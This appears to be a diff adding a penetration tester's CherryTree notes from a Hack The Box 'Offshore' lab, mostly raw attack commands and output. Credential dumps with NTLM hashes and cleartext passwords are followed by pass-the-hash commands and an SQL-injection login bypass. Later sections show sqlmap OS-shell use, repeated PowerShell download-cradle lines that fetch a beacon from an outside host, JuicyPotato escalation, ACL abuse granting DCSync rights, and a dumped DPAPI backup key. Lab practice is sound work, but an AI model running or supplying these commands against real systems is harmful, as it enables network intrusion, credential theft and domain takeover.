+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6731603 (00000000:0066b753)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/8/2019 8:08:01 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6730529 (00000000:0066b321)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/8/2019 8:08:01 AM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+</rich_text>
+					<rich_text weight="heavy">Authentication Id : 0 ; 224890 (00000000:00036e7a)
+Session           : Interactive from 1
+User Name         : wsadmin
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 2:13:30 AM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-1820
+	msv :	
+	 [00000003] Primary
+	 * Username : wsadmin
+	 * Domain   : CORP
+	 * NTLM     : 669b12a3bac275251170afbe2c5de8c2
+	 * SHA1     : 62e3e767c5d2ad6521d8d3e0e672e299437ed666
+	 * DPAPI    : 41aff401de68a7ae9e94bdb6907dddb2
+	tspkg :	
+	wdigest :	
+	 * Username : wsadmin
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wsadmin
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	</rich_text>
+					<rich_text>
+
+Authentication Id : 0 ; 224812 (00000000:00036e2c)
+Session           : Interactive from 1
+User Name         : wsadmin
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 2:13:30 AM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-1820
+	msv :	
+	 [00000003] Primary
+	 * Username : wsadmin
+	 * Domain   : CORP
+	 * NTLM     : 669b12a3bac275251170afbe2c5de8c2
+	 * SHA1     : 62e3e767c5d2ad6521d8d3e0e672e299437ed666
+	 * DPAPI    : 41aff401de68a7ae9e94bdb6907dddb2
+	tspkg :	
+	wdigest :	
+	 * Username : wsadmin
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wsadmin
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:13:00 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 69718 (00000000:00011056)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:59 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 69689 (00000000:00011039)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:59 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WSADM$
+Domain            : CORP
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:58 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wsadm$
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40404 (00000000:00009dd4)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:57 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40386 (00000000:00009dc2)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:57 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 39490 (00000000:00009a42)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:57 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WSADM$
+Domain            : CORP
+Logon Server      : (null)
+Logon Time        : 10/8/2019 2:12:57 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wsadm$
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="WS02" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570562312.44" ts_lastsave="1571228242.82" unique_id="26">
+				<rich_text>IP: 172.16.1.101
+
+Execute commands:
+
+- proxychains xfreerdp /u:wsadmin /pth:669b12a3bac275251170afbe2c5de8c2 /d:corp /size:80% /v:172.16.1.101
+   → FAILED DUE TO RESTRICTIONS
+
+- proxychains crackmapexec 172.16.1.101 -u wsadmin -H 669b12a3bac275251170afbe2c5de8c2 -x 'whoami'
+   → Command execution works
+
+
+BEACON ON HOST
+- proxychains python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes 0:669b12a3bac275251170afbe2c5de8c2 wsadmin@172.16.1.101 &quot;powershell iex (new-object net.webclient).downloadstring('http://10.10.14.6/update')&quot;
+
+- SYSTEM Shell from Cobalt Strike
+   → psexec WS02 C$ https
+
+- Found web.config_sample file in C:\Backups (Contained clear text password for svc_iis)
+   →  &lt;authentication mode=&quot;Forms&quot;&gt;      
+            &lt;credentials passwordFormat=&quot;Clear&quot;&gt;      
+              </rich_text>
+				<rich_text weight="heavy">  &lt;user name=&quot;svc_iis&quot; password=&quot;Vintage!&quot; /&gt;  </rich_text>
+				<rich_text>    
+            &lt;/credentials&gt;      
+        &lt;/authentication&gt;
+        
+ - Added corp\svc_iis to “Remote Desktop Users” localgroup
+    - proxychains rdesktop -g 80% 172.16.1.101
+        
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Web-Win01" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569941044.55" ts_lastsave="1571178382.97" unique_id="21">
+				<rich_text>IP: 172.16.1.24
+
+Logged into Website
+    - ssh -L 127.0.0.1:8000:172.16.1.24:80 root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+    - Logged in with ned.flanders_adm:Lefthandedyeah!
+        - Site says Hello World
+                
+ - Ran gobuster on 172.16.1.24 to find other pages
+    - gobuster dir -U 'corp\svc_iis' -P 'Vintage!' -w /opt/seclists/Discovery/Web-Content/common.txt -x asp,aspx,php,html -u </rich_text>
+				<rich_text link="webs http://127.0.0.1:8000">http://127.0.0.1:8000</rich_text>
+				<rich_text>
+    
+ - Found page: </rich_text>
+				<rich_text link="webs http://172.16.1.24/login.aspx">http://172.16.1.24/login.aspx</rich_text>
+				<rich_text>
+    
+ - Logged into page with
+    - Username: Test
+    - Password: ' or 1=1 or '1'='1 
+
+- SQLMAP Data Dump (Access to SQL01)
+proxychains sqlmap -u </rich_text>
+				<rich_text link="webs http://172.16.1.24/login.aspx">http://172.16.1.24/login.aspx</rich_text>
+				<rich_text> --auth-type=&quot;Basic&quot; --auth-cred=&quot;corp\svc_iis:Vintage!&quot; --data='__VIEWSTATE=%2FwEPDwUKLTU0OTMyMjYxNA9kFgICAw9kFgYCBQ8PFgIeBFRleHQFIUxvZ2luIGZhaWxlZDogSW52YWxpZCBjcmVkZW50aWFsc2RkAgsPPCsADQEADxYCHgdFbmFibGVkaGRkAg0PDxYCHwFoZGQYAQUJR3JpZFZpZXcxD2dkR%2FDN3a2lvN3y%2FvZqvnqFrgJxbp8%3D&amp;__EVENTVALIDATION=%2FwEWBALa5risBALt8L%2B0AQKpzpH0DQKWrKCPD4NiJ7OU600eLL2KakRIKTVl88xj&amp;TextBoxUsername=admin&amp;TextBoxPassword=admin&amp;ButtonLogin=Login' -a
+
+
+- SQLMAP OS CMD EXECUTION:
+   sqlmap -u http://127.0.0.1:8000/login.aspx --auth-type=&quot;Basic&quot; --auth-cred=&quot;corp\svc_iis:Vintage!&quot; --data='__VIEWSTATE=%2FwEPDwUKLTU0OTMyMjYxNA9kFgICAw9kFgICCw88KwANAGQYAQUJR3JpZFZpZXcxD2dkn8oLDLZKudgJlXL4Fg76R%2BfbjKg%3D&amp;__EVENTVALIDATION=%2FwEWBALQ%2B5SfDwLt8L%2B0AQKpzpH0DQKWrKCPD6FKoyxSY%2Bf72Xi76ITylt4kI7rS&amp;TextBoxUsername=bob&amp;TextBoxPassword=Str0ngP%40ss%21&amp;ButtonLogin=Login' --batch --os-shell
+
+- Beacon to SQL01 Through Web-Win01 using SQLMAP Execution
+   os-shell&gt; cmd.exe /c &quot;powershell.exe iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<rich_text>
+</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569941054.34" ts_lastsave="1569941056.25" unique_id="22">
+					<rich_text>Nmap scan report for 172.16.1.24
+Host is up (0.038s latency).
+
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   closed ssh
+23/tcp   closed telnet
+25/tcp   closed smtp
+80/tcp   open   http
+110/tcp  closed pop3
+139/tcp  open   netbios-ssn
+443/tcp  closed https
+445/tcp  open   microsoft-ds
+3389/tcp open   ms-wbt-server</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Database Info" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571171901.41" ts_lastsave="1571171921.76" unique_id="14">
+					<rich_text>    ** Data values obtained using Burp Suite and -a dumps everything
+
+BANNER:
+    Microsoft SQL Server 2014 - 12.0.2000.8 (X64) 
+	Feb 20 2014 20:04:26 
+	Copyright (c) Microsoft Corporation
+	Express Edition (64-bit) on Windows NT 6.3 &lt;X64&gt; (Build 14393: ) (Hypervisor)
+---
+[08:35:28] [INFO] fetching current user
+current user: 'sa'
+[08:35:28] [INFO] fetching current database
+current database: 'WebApp'
+[08:35:28] [INFO] fetching server hostname
+hostname: 'SQL01\SQLEXPRESS'
+[08:35:28] [INFO] testing if current user is DBA
+current user is DBA: True
+
+
+database management system users roles:
+[*] ##MS_AgentSigningCertificate##
+[*] ##MS_PolicyEventProcessingLogin##
+[*] ##MS_PolicySigningCertificate##
+[*] ##MS_PolicyTsqlExecutionLogin##
+[*] ##MS_SmoExtendedSigningCertificate##
+[*] ##MS_SQLAuthenticatorCertificate##
+[*] ##MS_SQLReplicationSigningCertificate##
+[*] ##MS_SQLResourceSigningCertificate##
+[*] BUILTIN\\Users
+[*] NT AUTHORITY\\SYSTEM
+[*] NT Service\\MSSQL$SQLEXPRESS
+[*] NT SERVICE\\SQLWriter
+[*] NT SERVICE\\Winmgmt
+[*] sa (administrator)
+[*] SQL01\\Administrator
+
+
+
+Database: WebApp
+Table: Orders
+[3 entries]
++--------+---------+--------+-------------------+
+| UserId | OrderId | Amount | CreditCard       |
++--------+---------+--------+-------------------+
+| 1      | 1       | 100     | 3612-434-692-3201  |
+| 1      | 1       | 3000   | 3612-434-692-3201  |
+| 2      | 2       | 3000   | 4442-544-632-3321  |
++--------+---------+--------+-------------------+
+
+
+
+Database: WebApp
+Table: Users
+[3 entries]
++--------+----------+-------------+
+| UserID | Username | Password    |
++--------+----------+-------------+
+| 1      | Bob      | Str0ngP@ss! |
+| 2      | Rob      | S3cretP@ss!  |
+| 3      | Try       | Harder!           |
++--------+----------+-------------+</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="SQL01" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571144142.02" ts_lastsave="1571402611.99" unique_id="13">
+				<rich_text>IP: 172.16.1.5
+
+- Got access to databse through Web-Win01 SQL Injection using SQLMAP
+
+- SQLMAP OS CMD EXECUTION:
+   sqlmap -u http://127.0.0.1:8000/login.aspx --auth-type=&quot;Basic&quot; --auth-cred=&quot;corp\svc_iis:Vintage!&quot; --data='__VIEWSTATE=%2FwEPDwUKLTU0OTMyMjYxNA9kFgICAw9kFgICCw88KwANAGQYAQUJR3JpZFZpZXcxD2dkn8oLDLZKudgJlXL4Fg76R%2BfbjKg%3D&amp;__EVENTVALIDATION=%2FwEWBALQ%2B5SfDwLt8L%2B0AQKpzpH0DQKWrKCPD6FKoyxSY%2Bf72Xi76ITylt4kI7rS&amp;TextBoxUsername=bob&amp;TextBoxPassword=Str0ngP%40ss%21&amp;ButtonLogin=Login' --batch --os-shell
+
+- Beacon to SQL01 Through Web-Win01 using SQLMAP Execution
+   os-shell&gt; cmd.exe /c &quot;powershell.exe iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<rich_text>
+
+- Got System
+   → Identified the mssql$sqlexpress account has the SeImpersonatePrivilege permissions
+   → Found an exploit (JuicyPotato) which abuses this permission to get system level access
+   → Uploaded JuicyPotato.exe and Beacon.exe (Cobalt Strike Stageless Beacon) to the Download folder
+   → run JuicyPotato.exe -l 1337 -p c:\Users\MSSQL$SQLEXPRESS\Downloads\beacon.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+
+- Net use command shows unavailable mapped drive
+   → Unavailable  Z:        \\fs01\users\bill\documents
+   → Found Scheduled Task named “Map Share at boot”; ran task and drive was mapped.
+      ⇒ Downloaded backup.ps1 and flag.txt
+      ⇒ backup.ps1 contents contain username and password
+         • #set server location,credentials
+            $Server = &quot;\\172.16.4.100&quot;
+            $FullPath = &quot;$Server\q1\backups&quot;
+            $username = &quot;pgibbons&quot;
+            $password = &quot;I l0ve going Fishing!&quot;
+
+#### STEPS TO DA ####
+
+- Identified pgibbons has rights to change password to Salvador (per Bloodhound; AllExtendedRights permissions)
+   → powershell-import /home/user/Dropbox/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
+   → powerpick $newpwd = ConvertTo-SecureString -String &quot;Password1!&quot; -AsPlainText –Force; Set-DomainUserPassword -Identity salvador -AccountPassword $newpwd
+
+- Identified salvador has right to add members to the security group “Security Engineers” (per Bloodhound; GenericWrite)
+   → make_token corp\salvador Password1!
+   → shell net group &quot;</rich_text>
+				<rich_text weight="heavy">Security Engineers</rich_text>
+				<rich_text>&quot; salvador /add /domain
+
+- Identified the “Security Engineers” group can change password to Cyber_ADM (per Bloodhound; AllExtendedRights permissions)
+   → powerpick $newpwd = ConvertTo-SecureString -String &quot;Password1!&quot; -AsPlainText –Force; Set-DomainUserPassword -Identity cyber_adm -AccountPassword $newpwd
+
+- Identified Cyber_ADM has admin rights to Web-Win01 and Web-Win01 has WriteDacl to Corp.Local 
+   → Got Beacon on Web-Win01 in Cobalt Strike
+      ⇒ make_token corp\cyber_adm Password1!
+      ⇒ wmi web-win01.corp.local https
+
+- Identified Web-Win01 had WriteDacl permission to Corp.Local due to it being in the Legacy Web Servers group
+   → Ran the following command on Web-Win01 to give Cyber_ADM DCSync Rights
+      ⇒ powershell-import /home/user/Dropbox/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
+      ⇒ powerpick Add-DomainObjectAcl -TargetIdentity corp -PrincipalIdentity cyber_adm -Rights DCSync -Verbose
+
+** Additional Stuff identified
+
+-   Set permissions for cyber_adm to have GenericAll permissions to DC01 (Bloodhoud WriteDacl permissions)
+   →   powerpick Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity cyber_adm -Rights All -Verbose
+-   Checking ACLs for SID of Cyber_ADM
+   →   powershell Get-DomainObjectACL dc01 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq 'S-1-5-21-2291914956-3290296217-2402366952-1804'} -Verbose
+
+- Now able to view LAPS passwords from SQL or Cyber_ADM since they both have GenericAll permissions
+   → powershell get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+      ⇒ Needs to have AD Tools Installed see steps above for installing AD-Domain-Services Management Tools
+
+</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Original Method to DA" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571402312.1" ts_lastsave="1571402327.62" unique_id="31">
+					<rich_text>#### STEPS TO DA ####
+
+- Identified pgibbons has rights to change password to Salvador (per Bloodhound; AllExtendedRights permissions)
+   → powershell Install-windowsfeature -name AD-Domain-Services –IncludeManagementTools (On SQL01)
+   → powershell-import /home/user/Dropbox/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
+   → powershell $newpwd = ConvertTo-SecureString -String &quot;Password1!&quot; -AsPlainText –Force; Set-ADAccountPassword </rich_text>
+					<rich_text weight="heavy">salvador</rich_text>
+					<rich_text> -Server DC01.Corp.Local -NewPassword $newpwd –Reset
+
+- Identified salvador has right to add members to the security group “Security Engineers” (per Bloodhound; GenericWrite)
+   → make_token corp\salvador Password1!
+   → shell net group &quot;</rich_text>
+					<rich_text weight="heavy">Security Engineers</rich_text>
+					<rich_text>&quot; salvador /add /domain
+
+- Identified the “Security Engineers” group can change password to Cyber_ADM (per Bloodhound; AllExtendedRights permissions)
+- powershell $newpwd = ConvertTo-SecureString -String &quot;Password1!&quot; -AsPlainText –Force; Set-ADAccountPassword </rich_text>
+					<rich_text weight="heavy">cyber_adm</rich_text>
+					<rich_text> -Server DC01.Corp.Local -NewPassword $newpwd –Reset
+
+- Identified Cyber_ADM has admin rights to Web-Win01
+   → Got Beacon on Web-Win01 in Cobalt Strike
+      ⇒ make_token corp\cyber_adm Password1!
+      ⇒ wmi web-win01.corp.local https
+
+-   Set permissions for cyber_adm to have GenericAll permissions to DC01 (Bloodhoud
+   →   powerpick Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity cyber_adm -Rights All -Verbose
+-   Checking ACLs for SID of Cyber_ADM
+   →   powershell Get-DomainObjectACL dc01 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq 'S-1-5-21-2291914956-3290296217-2402366952-1804'} -Verbose
+
+- Now able to view LAPS passwords from SQL or Cyber_ADM since they both have GenericAll permissions
+   → powershell get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+      ⇒ Needs to have AD Tools Installed see steps above for installing AD-Domain-Services Management Tools
+
+- Identified Web-Win01 had permission to Corp.Local due to it being in the Legacy Web Servers group
+   → Ran the following command to get on Web-Win01 to give Cyber_ADM DCSync Rights
+      ⇒ powershell-import /home/user/Dropbox/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
+      ⇒ powerpick Add-DomainObjectAcl -TargetIdentity corp -PrincipalIdentity cyber_adm -Rights DCSync -Verbose</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="FS01" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571416965.84" ts_lastsave="1571418700.33" unique_id="32">
+				<rich_text>IP: 172.16.1.24
+
+-   This system has AMSI turned on.
+   → Tried to bypass AMSI: Failed
+   → Tried to turn off AV: Failed
+      ⇒ sc stop WinDefend: Failed
+ 
+-   Beacon that worked
+   → proxychains crackmapexec 172.16.1.26 -u iamtheadministrator -H 15da52f659978026ba6c3b28663ed959 -x &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<rich_text>
+
+
+-   Found Capture.pcap file in C:\Users\Joe\Documents
+   → tcpdump -Ar /home/user/htb/offshore/Downloads/FS01/capture.pcap</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="DC01" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571424889.98" ts_lastsave="1571507306.3" unique_id="33">
+				<rich_text>IP 172.16.1.5
+
+proxychains crackmapexec 172.16.1.5 -u iamtheadministrator -H 15da52f659978026ba6c3b28663ed959 -x &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="DNS Recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571424931.0" ts_lastsave="1571424933.06" unique_id="34">
+					<rich_text>Powershell Get-DNSServerZone
+
+ZoneName                          ZoneType      IsAutoCreated   IsDsIntegrated        
+--------                                      --------           -------------                 -----------
+_msdcs.corp.local                   Primary         False                      True       
+0.in-addr.arpa                        Primary         True                        False      
+127.in-addr.arpa                    Primary         True                        False      
+255.in-addr.arpa                    Primary         True                        False      
+corp.local                               Primary         False                       True       
+dev.admin.offshore.com        Forwarder       False                      False      
+TrustAnchors                          Primary         False                       True       
+</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="DPAPI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571507306.31" ts_lastsave="1571508568.58" unique_id="37">
+					<rich_text>[*] Using server                     : dc01.corp.local
+[*] Preferred backupkey Guid         : 396c15ad-49ec-4a2b-a289-e5f3465b52e1
+[*] Full preferred backupKeyName     : G$BCKUPKEY_396c15ad-49ec-4a2b-a289-e5f3465b52e1
+[*] Backup key written to            : corp_key.pvk
+
+Key
+
+HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAAEAAQC/TLP/E07XLRvrCOSL9Pve
+uNWkt+qfcmimSrA/dAuvhiiOU7W9mB91obYIvgl16C+tNLsR0upFGuNM38hOhkT9d2EvxgEaEo9fbdRO
+blr+MLXLBbyHQY2JveJ6TxxnrfZZJpWOwYu65OdST+1orLYXP9tUhHJNmzrp1nfETI5xktUw1lJxx2mH
+cBBvD1bDWaIvYefkweUFibS/JnQ4UvR7hgSmiW/TA4giu2rNMA26M4rkV3PHt9iBcPG+7NaZWuVhfuZ7
+J1ezkzINTk/9yWGNpSloG31lqnHi+Yd/YBI4sdp/F5YFwRDWjLmteOYfBrmP/Q8fWNXf+tFOiRdkbEn5
+8eOQoKnRP8B7KvxDxTD9S9MRT0s0X7hi8jQVAwTCNngVIdPzzEKoYpdrAUs/QYKu/IyZSovdvcPqG7SL
+OBR7XRW72qP1L2SkDiTHUYS7XQFscrVED8IoRjuKpoLAlydyjhIQt/6f/PZUUV4YAqlCtU49wrl87pd4
+vObK7lv6lvqvKz7SVDQcIZVV3UOKMtNfVlow+gE6g6mKd1R6CtVBiEP4aHQn+TRHawKqYLI04BFglZe4
+5UQOIUhroWdLM8/+qBsMcIHoBVi/3ix3TFABtz+GwAs4iy1xODYrMYRJiU2OBcHkoNxUKhTyGQD+O9LV
+HmOvstAYMHwzPZ+QdT6r/tF3wnmoyuo5yUdUghfi70RAshu1SeXhMWQZBELXkUQ50A0aBFobK8BFB0L5
+76o6GJPvgsZ3qTRCd336NWLhHszvwUVf5nffxvt9kgd2rSU2egD1dwVRb7Zw+lLNQEzT8FQyu+vXnSUk
+u2E9rq8Z/sgL3NWXbHfB2yHbW74y19ZB0fSL2ZhDbUaW3q0RjpKPjVDDeKfzuyQmrQDq6Uh+4Y+hPUmo
+CWOoY98DV7vGB+TTOWLJF+HXfHiEvAudRr8EmrMuuDNXhnsPQ6dOrUPuf3DwX5EsTjvRh3pylprd/Ku3
+COviFveXzBwj35Uqzf1n/cwqlrYGrK4+eQCXVz883bp0ZJS8UcjTa2J/HMYdUcGS9UeTaXuiNGhGEeF6
+7+iEISmOYd/ah0M/beebwUOThkoaMrqhikpIbAG3wMPTOEAoPHOjxORKzdJfaNSOw4wKNeavkeYHvRai
